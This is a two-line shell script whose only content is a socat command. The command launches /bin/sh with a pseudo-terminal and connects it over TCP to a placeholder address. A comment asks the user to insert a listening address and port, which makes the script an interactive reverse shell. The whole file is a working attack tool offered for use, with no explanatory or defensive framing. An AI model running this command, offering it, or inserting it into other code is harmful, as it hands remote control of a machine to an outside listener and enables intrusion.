#! /usr/bin/env sh

socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:xxx.xxx.xxx.xxx:xxxx #Insert listening `address:port` here
